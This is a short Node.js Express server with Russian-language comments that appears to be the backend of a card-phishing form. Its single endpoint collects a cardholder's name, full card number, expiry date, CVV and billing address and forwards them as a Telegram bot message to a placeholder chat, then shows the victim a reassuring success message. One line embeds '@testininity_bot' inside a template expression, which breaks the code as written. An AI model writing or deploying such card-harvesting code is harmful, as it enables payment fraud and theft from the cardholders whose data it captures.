const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.urlencoded({ extended: true }));

app.post('/submit_data', async (req, res) => {
    const { cardholder_name, card_number, expiry, cvv, billing_address, billing_city, billing_zip } = req.body;
    
    // Формируем сообщение для Telegram
    const text = `🚀 Новая заявка!\n\n👤 Имя: ${cardholder_name}\n💳 Карта: ${card_number}\n📅 Срок: ${expiry} | CVV: ${cvv}\n🏠 Адрес: ${billing_address}, ${billing_city}, ${billing_zip}`;
    
    const botToken = 'ВАШ_API_TOKEN';
    const chatId = 'ВАШ_CHAT_ID';

    try {
        // Отправка в Telegram
        await axios.post(`https://api.telegram.org/bot${@testininity_bot}/sendMessage`, {
            chat_id: chatId,
            text: text
        });
        
        // Ответ пользователю (редирект на «Спасибо» или просто текст)
        res.send('Данные успешно отправлены! Проверьте вашу почту.');
    } catch (error) {
        res.status(500).send('Ошибка при отправке данных.');
    }
});

app.listen(3000, () => console.log('Server running on port 3000'));
